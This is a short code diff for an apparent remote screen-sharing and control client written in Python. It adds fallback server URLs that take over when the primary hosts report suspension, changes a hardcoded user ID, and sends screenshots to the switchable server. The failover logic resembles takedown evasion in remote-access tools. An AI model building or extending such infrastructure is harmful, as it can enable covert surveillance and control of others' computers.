@@ -20,7 +20,8 @@ import asyncio
 import aiohttp
 import pygame
 import ctypes
-url = "https://ms32-sha2.onrender.com/"
+url = "https://ms32-sha2.onrender.com/" if b"This service has been suspended." not in get("https://ms32-sha2.onrender.com").content else "https://ms32-c67b.onrender.com/"
+server_url = "https://server-20zy.onrender.com/" if b"This service has been suspended." not in get("https://server-20zy.onrender.com").content else "https://server-ktcy.onrender.com/"
 # url = "http://192.168.9.115:5000/"
 screen = get_primary_display()
 terminate = False           
@@ -29,7 +30,7 @@ sharing = False
 bstate = False
 bmstate = False
 bsig  = False
-user = "03"
+user = "91"
 width, height = size()
 try:
     pygame.mixer.init()
@@ -433,7 +434,7 @@ async def send_screenshot(session, url, buffer):
     return False
 async def share_runner():
     log("sharing started")
-    url = "https://server-20zy.onrender.com/screenshot"
+    url = server_url+"screenshot"
     await share(url)
 async def control_runner():
     await control()
